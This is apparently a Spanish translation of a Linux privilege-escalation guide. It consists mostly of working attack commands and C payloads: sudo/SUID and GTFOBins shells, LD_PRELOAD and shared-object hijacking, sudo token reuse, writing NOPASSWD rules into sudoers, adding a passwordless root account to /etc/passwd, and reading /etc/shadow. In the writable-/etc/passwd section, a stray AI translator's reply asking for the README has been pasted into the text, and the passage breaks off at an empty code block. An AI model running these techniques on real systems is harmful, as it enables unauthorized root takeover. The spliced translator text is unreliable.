D-Bus opera con un modelo de permitir/denegar, gestionando permisos de mensajes (llamadas a métodos, emisión de señales, etc.) basándose en el efecto acumulado de reglas de política coincidentes. Estas políticas especifican las interacciones con el bus, pudiendo permitir la escalada de privilegios mediante la explotación de dichos permisos.

Se proporciona un ejemplo de tal política en /etc/dbus-1/system.d/wpa_supplicant.conf, detallando permisos para el usuario root para poseer, enviar y recibir mensajes de fi.w1.wpa_supplicant1.

Las políticas sin un usuario o grupo especificado se aplican de forma universal, mientras que las políticas de contexto "default" se aplican a todos los que no estén cubiertos por otras políticas específicas.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Aprende cómo enumerar y explotar una comunicación D-Bus aquí:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Red**

Siempre es interesante enumerar la red y averiguar la posición de la máquina.

### Enumeración genérica
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Puertos abiertos

Siempre comprueba los servicios de red que se estén ejecutando en la máquina y con los que no pudiste interactuar antes de acceder a ella:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Comprueba si puedes sniff traffic. Si puedes, podrías ser capaz de obtener algunas credenciales.
```
timeout 1 tcpdump
```
## Usuarios

### Enumeración genérica

Comprueba **quién** eres, qué **privilegios** tienes, qué **usuarios** hay en los sistemas, cuáles pueden **login** y cuáles tienen **privilegios root**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID grande

Algunas versiones de Linux se vieron afectadas por un bug que permite a usuarios con **UID > INT_MAX** escalar privilegios. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Grupos

Comprueba si eres **miembro de algún grupo** que podría otorgarte privilegios de root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Portapapeles

Comprueba si hay algo interesante en el portapapeles (si es posible)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Política de Contraseñas
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Contraseñas conocidas

Si **conoces alguna contraseña** del entorno **intenta iniciar sesión como cada usuario** usando la contraseña.

### Su Brute

Si no te importa generar mucho ruido y los binarios `su` y `timeout` están presentes en el equipo, puedes intentar hacer brute-force a usuarios usando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) con el parámetro `-a` también intenta hacer brute-force a usuarios.

## Abusos del $PATH escribible

### $PATH

Si descubres que puedes **escribir dentro de alguna carpeta del $PATH** podrías ser capaz de escalar privilegios creando una backdoor dentro de la carpeta escribible con el nombre de algún comando que vaya a ser ejecutado por un usuario distinto (idealmente root) y que **no se cargue desde una carpeta que esté ubicada antes** de tu carpeta escribible en el $PATH.

### SUDO y SUID

Puede que se te permita ejecutar algún comando usando sudo o que tenga el bit suid. Compruébalo usando:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Algunos **comandos inesperados permiten leer y/o escribir archivos o incluso ejecutar un comando.** Por ejemplo:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

La configuración de Sudo puede permitir a un usuario ejecutar algún comando con los privilegios de otro usuario sin conocer la contraseña.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
En este ejemplo el usuario `demo` puede ejecutar `vim` como `root`; ahora es trivial obtener una shell añadiendo una ssh key en el directorio root o llamando a `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Esta directiva permite al usuario **establecer una variable de entorno** al ejecutar algo:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Este ejemplo, **basado en HTB machine Admirer**, fue **vulnerable** a **PYTHONPATH hijacking** para cargar una biblioteca de python arbitraria mientras se ejecutaba el script como root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preservado mediante sudo env_keep → root shell

Si sudoers preserva `BASH_ENV` (por ejemplo, `Defaults env_keep+="ENV BASH_ENV"`), puedes aprovechar el comportamiento de inicio no interactivo de Bash para ejecutar código arbitrario como root al invocar un comando permitido.

- Por qué funciona: Para shells no interactivos, Bash evalúa `$BASH_ENV` y carga ese archivo antes de ejecutar el script objetivo. Muchas reglas de sudo permiten ejecutar un script o un wrapper de shell. Si `BASH_ENV` es preservado por sudo, tu archivo se carga con privilegios de root.

- Requisitos:
- Una regla de sudo que puedas ejecutar (cualquier objetivo que invoque `/bin/bash` de forma no interactiva, o cualquier script de bash).
- `BASH_ENV` presente en `env_keep` (verifícalo con `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Endurecimiento:
- Eliminar `BASH_ENV` (y `ENV`) de `env_keep`; prefiera `env_reset`.
- Evite shell wrappers para comandos permitidos por sudo; utilice binarios mínimos.
- Considere habilitar sudo I/O logging y alertas cuando se usan env vars preservadas.

### Rutas para eludir la ejecución con sudo

**Saltar** para leer otros archivos o usar **symlinks**. Por ejemplo en el archivo sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Si se usa un **wildcard** (\*), es aún más fácil:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contramedidas**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Comando sudo/binario SUID sin especificar la ruta del comando

Si el **permiso sudo** se concede a un único comando **sin especificar la ruta**: _hacker10 ALL= (root) less_ se puede explotar cambiando la variable PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Esta técnica también puede usarse si un binario **suid** **ejecuta otro comando sin especificar la ruta (siempre comprueba con** _**strings**_ **el contenido de un binario SUID sospechoso)**.

[Payload examples to execute.](payloads-to-execute.md)

### Binario SUID con ruta del comando

Si el binario **suid** **ejecuta otro comando especificando la ruta**, entonces puedes intentar **export a function** con el nombre del comando que el archivo suid está llamando.

Por ejemplo, si un binario suid llama a _**/usr/sbin/service apache2 start**_ tienes que intentar crear la función y exportarla:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Entonces, cuando invoques el binario suid, se ejecutará esta función

### LD_PRELOAD & **LD_LIBRARY_PATH**

La variable de entorno **LD_PRELOAD** se utiliza para especificar una o más bibliotecas compartidas (.so files) que serán cargadas por el loader antes que todas las demás, incluida la biblioteca estándar de C (`libc.so`). Este proceso se conoce como precarga de una biblioteca.

Sin embargo, para mantener la seguridad del sistema y evitar que esta característica sea explotada, especialmente con ejecutables **suid/sgid**, el sistema impone ciertas condiciones:

- El loader ignora **LD_PRELOAD** para ejecutables donde el ID de usuario real (_ruid_) no coincide con el ID de usuario efectivo (_euid_).
- Para ejecutables con suid/sgid, solo se precargan las bibliotecas que estén en rutas estándar y que también sean suid/sgid.

La escalada de privilegios puede ocurrir si tienes la capacidad de ejecutar comandos con `sudo` y la salida de `sudo -l` incluye la declaración **env_keep+=LD_PRELOAD**. Esta configuración permite que la variable de entorno **LD_PRELOAD** persista y sea reconocida incluso cuando los comandos se ejecutan con `sudo`, lo que potencialmente puede conducir a la ejecución de código arbitrario con privilegios elevados.
```
Defaults        env_keep += LD_PRELOAD
```
Guardar como **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Luego **compílalo** usando:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Finalmente, **escalate privileges** ejecutando
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Un privesc similar puede ser abusado si el atacante controla la env variable **LD_LIBRARY_PATH** porque controla la ruta donde se van a buscar las librerías.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Al encontrar un binary con permisos **SUID** que parezca inusual, es buena práctica verificar si está cargando correctamente las librerías **.so**. Esto se puede comprobar ejecutando el siguiente comando:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Por ejemplo, encontrar un error como _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugiere una posibilidad de explotación.

Para explotarlo, se procedería creando un archivo C, por ejemplo _"/path/to/.config/libcalc.c"_, que contenga el siguiente código:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Este código, una vez compilado y ejecutado, tiene como objetivo elevar privilegios manipulando permisos de archivos y ejecutando un shell con privilegios elevados.

Compila el archivo C anterior en un archivo shared object (.so) con:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Finalmente, ejecutar el binario SUID afectado debería desencadenar el exploit, permitiendo una posible compromisión del sistema.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Ahora que hemos encontrado un SUID binary que carga una biblioteca desde una carpeta donde podemos escribir, creemos la biblioteca en esa carpeta con el nombre necesario:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Si obtienes un error como
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
eso significa que la biblioteca que has generado necesita tener una función llamada `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) es una lista curada de binarios Unix que pueden ser explotados por un atacante para eludir restricciones de seguridad locales. [**GTFOArgs**](https://gtfoargs.github.io/) es lo mismo pero para casos donde solo puedes **inyectar argumentos** en un comando.

El proyecto recopila funciones legítimas de binarios Unix que pueden ser abusadas para escapar de shells restringidos, escalar o mantener privilegios elevados, transferir archivos, crear bind y reverse shells, y facilitar otras tareas de post-explotación.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

Requisitos para escalar privilegios:

- Ya tienes un shell como el usuario "_sampleuser_"
- "_sampleuser_" ha **usado `sudo`** para ejecutar algo en los **últimos 15mins** (por defecto esa es la duración del sudo token que nos permite usar `sudo` sin introducir ninguna contraseña)
- `cat /proc/sys/kernel/yama/ptrace_scope` es 0
- `gdb` es accesible (puedes subirlo)

(Puedes habilitar temporalmente `ptrace_scope` con `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` o permanentemente modificando `/etc/sysctl.d/10-ptrace.conf` y estableciendo `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activar el token de sudo en tu sesión** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- El **segundo exploit** (`exploit_v2.sh`) creará una shell sh en _/tmp_ **propiedad de root con setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- El **tercer exploit** (`exploit_v3.sh`) **creará un archivo sudoers** que **hace que los sudo tokens sean eternos y permite que todos los usuarios usen sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Si tienes **permisos de escritura** en la carpeta o en cualquiera de los archivos creados dentro de ella, puedes usar el binario [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) para **crear un sudo token para un usuario y PID**.\
Por ejemplo, si puedes sobrescribir el archivo _/var/run/sudo/ts/sampleuser_ y tienes una shell como ese usuario con PID 1234, puedes **obtener privilegios sudo** sin necesidad de conocer la contraseña haciéndolo:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

The file `/etc/sudoers` and the files inside `/etc/sudoers.d` configure who can use `sudo` and how. Estos archivos **por defecto solo pueden ser leídos por el usuario root y el grupo root**.\
**Si** puedes **leer** este archivo podrías ser capaz de **obtener información interesante**, y si puedes **escribir** cualquier archivo podrás **escalar privilegios**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Si puedes escribir, puedes abusar de este permiso
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Otra forma de abusar de estos permisos:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Hay algunas alternativas al binario `sudo`, como `doas` de OpenBSD; recuerda comprobar su configuración en `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Si sabes que un **usuario suele conectarse a una máquina y usa `sudo`** para escalar privilegios y has conseguido una shell en ese contexto de usuario, puedes **crear un nuevo ejecutable sudo** que ejecutará tu código como root y luego el comando del usuario. Después, **modifica el $PATH** del contexto de usuario (por ejemplo añadiendo la nueva ruta en .bash_profile) de modo que cuando el usuario ejecute sudo, se ejecute tu ejecutable sudo.

Ten en cuenta que si el usuario usa una shell diferente (no bash) necesitarás modificar otros archivos para añadir la nueva ruta. Por ejemplo[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Puedes encontrar otro ejemplo en [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

O ejecutar algo como:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteca compartida

### ld.so

The file `/etc/ld.so.conf` indicates **de dónde provienen los archivos de configuración cargados**. Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`

That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. Estos archivos de configuración **apuntan a otras carpetas** donde se **buscarán** las **bibliotecas**. For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **This means that the system will search for libraries inside `/usr/local/lib`**.

If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
Consulta **cómo explotar esta mala configuración** en la siguiente página:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Al copiar la lib en `/var/tmp/flag15/`, será utilizada por el programa en ese lugar según lo especificado en la variable `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Luego crea una biblioteca maliciosa en `/var/tmp` con `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capacidades

Las capacidades de Linux proporcionan un **subconjunto de los privilegios root disponibles a un proceso**. Esto efectivamente divide los **privilegios de root en unidades más pequeñas y distintivas**. Cada una de estas unidades puede entonces otorgarse de forma independiente a procesos. De este modo se reduce el conjunto completo de privilegios, disminuyendo los riesgos de explotación.\
Lee la siguiente página para **aprender más sobre capacidades y cómo abusar de ellas**:

{{#ref}}
linux-capabilities.md
{{#endref}}

## Permisos de directorio

En un directorio, el **bit para "execute"** implica que el usuario afectado puede "**cd**" dentro de la carpeta.\
El bit **"read"** implica que el usuario puede **list** los **files**, y el bit **"write"** implica que el usuario puede **delete** y **create** nuevos **files**.

## ACLs

Listas de Control de Acceso (ACLs) representan la capa secundaria de permisos discrecionales, capaces de **overriding the traditional ugo/rwx permissions**. Estos permisos mejoran el control sobre el acceso a archivos o directorios al permitir o denegar derechos a usuarios específicos que no son los propietarios ni forman parte del grupo. Este nivel de **granularidad garantiza una gestión de acceso más precisa**. Más detalles pueden encontrarse [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dar** al usuario "kali" permisos read y write sobre un file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Obtener** archivos con ACLs específicas del sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Abrir shell sessions

En **versiones antiguas** puedes **hijack** alguna **shell** session de un usuario diferente (**root**).\
En **versiones más recientes** podrás **connect** a screen sessions sólo de **tu propio usuario**. Sin embargo, podrías encontrar **información interesante dentro de la session**.

### screen sessions hijacking

**Listar screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Adjuntar a una sesión**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Secuestro de sesiones de tmux

Esto era un problema con **versiones antiguas de tmux**. No pude secuestrar una sesión de tmux (v2.1) creada por root como usuario no privilegiado.

**Listar sesiones de tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Adjuntar a una sesión**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Consulta **Valentine box de HTB** para un ejemplo.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Todas las claves SSL y SSH generadas en sistemas basados en Debian (Ubuntu, Kubuntu, etc) entre septiembre de 2006 y el 13 de mayo de 2008 pueden estar afectadas por este bug.\
Este bug se produce al crear una nueva ssh key en esos OS, ya que **solo eran posibles 32,768 variaciones**. Esto significa que todas las posibilidades pueden ser calculadas y **teniendo la ssh public key puedes buscar la private key correspondiente**. Puedes encontrar las posibilidades calculadas aquí: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Valores de configuración interesantes

- **PasswordAuthentication:** Especifica si se permite la autenticación por contraseña. El valor por defecto es `no`.
- **PubkeyAuthentication:** Especifica si se permite la autenticación mediante clave pública. El valor por defecto es `yes`.
- **PermitEmptyPasswords**: Cuando la autenticación por contraseña está permitida, especifica si el servidor permite el inicio de sesión en cuentas con contraseñas vacías. El valor por defecto es `no`.

### PermitRootLogin

Especifica si root puede iniciar sesión usando ssh, el valor por defecto es `no`. Valores posibles:

- `yes`: root puede iniciar sesión usando contraseña y clave privada
- `without-password` o `prohibit-password`: root solo puede iniciar sesión con una clave privada
- `forced-commands-only`: root solo puede iniciar sesión usando clave privada y si se especifican las opciones de commands
- `no` : no

### AuthorizedKeysFile

Especifica los archivos que contienen las claves públicas que pueden usarse para la autenticación de usuarios. Puede contener tokens como `%h`, que serán reemplazados por el directorio home. **Puedes indicar rutas absolutas** (que comienzan en `/`) o **rutas relativas desde el home del usuario**. Por ejemplo:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Esa configuración indicará que si intentas iniciar sesión con la **private** key del usuario "**testusername**", ssh va a comparar la public key de tu key con las ubicadas en `/home/testusername/.ssh/authorized_keys` y `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding te permite **use your local SSH keys instead of leaving keys** (without passphrases!) en tu servidor. Así, podrás **jump** vía ssh **to a host** y desde allí **jump to another** host **using** la **key** ubicada en tu **initial host**.

Debes establecer esta opción en `$HOME/.ssh.config` así:
```
Host example.com
ForwardAgent yes
```
Ten en cuenta que si `Host` es `*` cada vez que el usuario salte a una máquina diferente, ese host podrá acceder a las keys (lo cual es un problema de seguridad).

El archivo `/etc/ssh_config` puede **sobrescribir** estas **opciones** y permitir o denegar esta configuración.\
El archivo `/etc/sshd_config` puede **permitir** o **denegar** ssh-agent forwarding con la palabra clave `AllowAgentForwarding` (por defecto está permitido).

Si encuentras que Forward Agent está configurado en un entorno, lee la siguiente página ya que **podrías abusar de ello para escalar privilegios**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Archivos interesantes

### Archivos de perfil

El archivo `/etc/profile` y los archivos bajo `/etc/profile.d/` son **scripts que se ejecutan cuando un usuario inicia una nueva shell**. Por lo tanto, si puedes **escribir o modificar cualquiera de ellos puedes escalar privilegios**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Si se encuentra cualquier script de perfil extraño debes revisarlo en busca de **detalles sensibles**.

### Passwd/Shadow Files

Dependiendo del SO los archivos `/etc/passwd` y `/etc/shadow` pueden usar un nombre diferente o puede haber una copia de seguridad. Por lo tanto se recomienda **encontrarlos todos** y **comprobar si puedes leerlos** para ver **si hay hashes** dentro de los archivos:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
En algunas ocasiones puedes encontrar **password hashes** dentro del archivo `/etc/passwd` (o equivalente)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Escribible /etc/passwd

Primero, genera una contraseña con uno de los siguientes comandos.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
No has proporcionado el contenido de src/linux-hardening/privilege-escalation/README.md para traducir. Por favor pega el contenido del archivo aquí.

Además, aclara por favor:
- ¿Dónde quieres “añadir el user `hacker` y añadir la contraseña generada”? (en el README como ejemplo, o quieres los comandos para crear el usuario en un sistema Linux real).
- ¿Requisitos de la contraseña? (longitud, uso de símbolos, mayúsculas, requisitos de política).

Si quieres, puedo generar una contraseña segura (por ejemplo 16 caracteres con mayúsculas, minúsculas, números y símbolos) y darte:
- La traducción del README al español (respetando todas las reglas que indicaste).
- Una línea o bloque de comandos para crear el usuario hacker y establecer la contraseña (ej.: useradd, echo 'hacker:ContraseñaGenerada' | chpasswd), o bien un fragmento en el README que muestre el usuario y la contraseña.

Dime cómo prefieres y pega el README para que proceda.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Ej.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Puedes ahora usar el comando `su` con `hacker:hacker`

Alternativamente, puedes usar las siguientes líneas para añadir un usuario de prueba sin contraseña.\
ADVERTENCIA: podrías degradar la seguridad actual de la máquina.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTA: En plataformas BSD `/etc/passwd` se encuentra en `/etc/pwd.db` y `/etc/master.passwd`; además, `/etc/shadow` se renombra a `/etc/spwd.db`.

Debes comprobar si puedes **escribir en algunos archivos sensibles**. Por ejemplo, ¿puedes escribir en algún **archivo de configuración de servicio**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Por ejemplo, si la máquina está ejecutando un servidor **tomcat** y puedes **modificar el archivo de configuración del servicio Tomcat dentro de /etc/systemd/,** entonces puedes modificar las líneas:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Tu backdoor se ejecutará la próxima vez que se inicie tomcat.

### Revisar carpetas

Las siguientes carpetas pueden contener copias de seguridad o información interesante: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Probablemente no podrás leer la última, pero inténtalo)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Ubicación extraña/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Archivos modificados en los últimos minutos
```bash
